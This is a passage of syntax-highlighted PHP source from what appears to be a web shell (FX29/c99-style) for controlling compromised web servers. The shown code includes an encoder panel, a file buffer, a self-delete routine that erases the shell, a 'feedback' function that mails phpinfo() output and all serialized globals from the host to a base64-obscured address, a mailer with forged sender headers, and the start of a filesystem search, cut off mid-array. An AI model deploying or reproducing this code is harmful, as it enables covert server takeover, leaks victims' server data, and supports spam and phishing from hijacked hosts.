<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;base64_decode:&amp;lt;/td&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">))</span> <span class="o">!=</span> <span class="nv">$encoder_input</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;input type=&quot;text&quot; size=&quot;35&quot; value=&quot;Failed!&quot; disabled readonly&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&amp;#92;&amp;#48;&quot;</span><span class="p">,</span><span class="s2">&quot;[0]&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="nv">$a</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
      <span class="nv">$debase64</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$debase64</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;input type=text size=35 onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$rows</span><span class="o">++</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">40</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">debase64</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$debase64</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">set_encoder_input(document.forms.encoder.debase64.value)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[Send to input]&amp;lt;/a&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
         <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Base convertations:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;dec2hex&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span>
         <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">35</span><span class="se">\&quot;</span><span class="s2"> onFocus=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseover=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> onMouseout=</span><span class="se">\&quot;</span><span class="s2">this.select()</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$c</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$hex</span> <span class="o">=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nv">$encoder_input</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;%&quot;</span><span class="o">.</span><span class="nv">$hex</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="c1">###[ FILESYSTEM BUFFER ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fsbuff&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$arr_copy</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">];</span>
    <span class="nv">$arr_cut</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">];</span>
    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$arr_copy</span><span class="p">,</span><span class="nv">$arr_cut</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;h2&amp;gt;&amp;lt;center&amp;gt;Buffer is empty!&amp;lt;/center&amp;gt;&amp;lt;/h2&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nv">$fx_infohead</span> <span class="o">=</span> <span class="s2">&quot;File-System Buffer&quot;</span><span class="p">;</span>
      <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span>
      <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
      <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ SELF REMOVE ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;selfremove&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;div class=&quot;barheader&quot;&amp;gt;</span>
<span class="x">    .: SELF KILL :.</span>
<span class="x">    &amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">((</span><span class="o">@</span><span class="nv">$submit</span> <span class="o">==</span> <span class="o">@</span><span class="nv">$rndcode</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">@</span><span class="nv">$submit</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">))</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="s2">&quot;Thanks for using &quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">;</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$rndcode</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Error: Incorrect confirmation code!&quot;</span><span class="p">);</span> <span class="p">}</span>
      <span class="nv">$rnd</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;form name=&quot;f_killshell&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;selfremove&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;rndcode&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$rnd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">    Are you sure want to remove this shell ?&amp;lt;br&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span> <span class="nx">disp_error</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;br&amp;gt;For confirmation, enter &quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$rnd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;text&quot; name=&quot;submit&quot;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;submit&quot; value=&quot;KILL&quot;&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="x">&amp;lt;/div&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ FEEDBACK ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;feedback&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$suppmail</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;ZmVlbGNvbXpAZ21haWwuY29t&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$ticket</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">microtime</span><span class="p">()</span><span class="o">+</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)),</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
      <span class="nv">$body</span> <span class="o">=</span> <span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; feedback #&quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Name: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">E-mail: &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_email</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Message:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$fdbk_body</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">IP: &quot;</span><span class="o">.</span><span class="nv">$REMOTE_ADDR</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fdbk_ref</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
        <span class="nb">ob_clean</span><span class="p">();</span>
        <span class="nb">phpinfo</span><span class="p">();</span>
        <span class="nv">$phpinfo</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">ob_get_contents</span><span class="p">());</span>
        <span class="nb">ob_clean</span><span class="p">();</span>
        <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
        <span class="nv">$body</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;phpinfo(): &quot;</span><span class="o">.</span><span class="nv">$phpinfo</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">GLOBALS=&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nb">mail</span><span class="p">(</span><span class="nv">$suppmail</span><span class="p">,</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; feedback #&quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="p">,</span><span class="nv">$body</span><span class="p">,</span><span class="s2">&quot;FROM: &quot;</span><span class="o">.</span><span class="nv">$suppmail</span><span class="p">);</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Thanks for your feedback! Your ticket ID: &quot;</span><span class="o">.</span><span class="nv">$ticket</span><span class="o">.</span><span class="s2">&quot;.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;div class=&quot;barheader&quot;&amp;gt;.: Feedback or report bug (</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;@&quot;</span><span class="p">,</span><span class="s2">&quot;.&quot;</span><span class="p">),</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;[at]&quot;</span><span class="p">,</span><span class="s2">&quot;[dot]&quot;</span><span class="p">),</span><span class="nv">$suppmail</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">) :.&amp;lt;/div&amp;gt;</span>
<span class="x">&amp;lt;form name=&quot;f_feedback&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;feedback&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table class=&quot;contents&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Your name:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;fdbk_name&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Your e-mail:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;fdbk_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Message:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=&quot;fdbk_body&quot; cols=80 rows=10&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$fdbk_body</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;hidden&quot; name=&quot;fdbk_ref&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$HTTP_REFERER</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;checkbox&quot; name=&quot;fdbk_servinf&quot; value=&quot;1&quot; checked&amp;gt; Attach Server info (Recommended for bug-fix)&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ PHP MAILER (By FaTaLisTiCz_Fx) ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fxmailer&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">    &amp;lt;div class=&quot;barheader&quot;&amp;gt;.: Mailer :.&amp;lt;/div&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">)){</span>
      <span class="nv">$headers</span>  <span class="o">=</span> <span class="s1">&#39;To: &#39;</span><span class="o">.</span><span class="nv">$dest_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$sender_name</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$sender_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$dest_email</span><span class="p">,</span><span class="nv">$sender_subj</span><span class="p">,</span><span class="nv">$sender_body</span><span class="p">,</span><span class="nv">$headers</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Email sent to </span><span class="si">$dest_email</span><span class="s2">!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Can&#39;t send email!&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
  <span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;form name=&quot;f_mailer&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;fxmailer&quot;&amp;gt;</span>
<span class="x">    &amp;lt;table class=&quot;contents&quot;&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Your name:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sender_name&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Your e-mail:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sender_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;To:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;dest_email&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dest_email</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Subject:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input size=&quot;70&quot; type=&quot;text&quot; name=&quot;sender_subj&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_subj</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Message:&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=&quot;sender_body&quot; cols=&quot;80&quot; rows=&quot;10&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_body</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/textarea&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">        &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Send&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="c1">###[ SEARCH ]###</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;search&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>


<span class="x">&amp;lt;div class=barheader&amp;gt;.: Filesystem Search :.&amp;lt;/div&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_in</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_name</span> <span class="o">=</span> <span class="s2">&quot;(.*)&quot;</span><span class="p">;</span> <span class="nv">$search_name_regexp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_text_wwo</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_text_regexp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$found</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
      <span class="nv">$found_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$found_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$search_i_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$search_i_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
          <span class="s2">&quot;name&quot;</span>        <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_name</span><span class="p">,</span>
          <span class="s2">&quot;name_regexp&quot;</span>    <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_name_regexp</span><span class="p">,</span>
          <span class="s2">&quot;text&quot;</span>        <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_text</span><span class="p">,</span>
          <span class="s2">&quot;text_regexp&quot;</span>    <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_text_regxp</span><span class="p">,</span>
          <span class="s2">&quot;text_wwo&quot;</span>    <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nv">$search_text_wwo</span><span class="p">,</span>
